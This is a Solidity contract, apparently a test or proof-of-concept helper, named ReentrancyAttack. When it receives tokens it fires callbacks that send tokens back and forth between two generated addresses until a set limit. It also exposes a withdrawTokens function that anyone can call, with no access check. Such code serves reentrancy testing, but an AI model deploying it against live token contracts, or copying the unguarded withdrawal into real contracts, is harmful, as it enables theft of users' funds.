contract ReentrancyAttack {
    IERC20 public token;
    bool public isAttacking;
    uint256 public reentrancyCount;
    uint256 public maxReentrancy;
    address public addressA;
    address public addressB;

    constructor(address _token) {
        token = IERC20(_token);
        // Create two internal addresses for ping-pong
        addressA = address(uint160(uint256(keccak256(abi.encodePacked("addressA", block.timestamp)))));
        addressB = address(uint160(uint256(keccak256(abi.encodePacked("addressB", block.timestamp)))));
    }

    function startAttack(uint256 _maxReentrancy) external {
        isAttacking = true;
        reentrancyCount = 0;
        maxReentrancy = _maxReentrancy;
    }

    function completeAttack() external {
        isAttacking = false;
    }

    // This function simulates a token transfer callback
    function onTransferReceived(address from, uint256 amount) external {
        if (!isAttacking || reentrancyCount >= maxReentrancy) {
            return;
        }

        reentrancyCount++;

        // Alternate between addressA and addressB
        if (from == addressA) {
            // Transfer from this contract to addressB
            token.transfer(addressB, 1 * 10**9);
        } else if (from == addressB) {
            // Transfer from this contract to addressA
            token.transfer(addressA, 1 * 10**9);
        } else {
            // Initial transfer, start ping-pong
            token.transfer(addressA, 1 * 10**9);
        }
    }

    // Function to handle token transfers
    function transfer(address to, uint256 amount) external returns (bool) {
        // When tokens are transferred to this contract, trigger the attack
        if (isAttacking && reentrancyCount < maxReentrancy) {
            this.onTransferReceived(msg.sender, amount);
        }
        return true;
    }

    // Function to withdraw tokens
    function withdrawTokens(address to, uint256 amount) external {
        token.transfer(to, amount);
    }

    receive() external payable {}
}

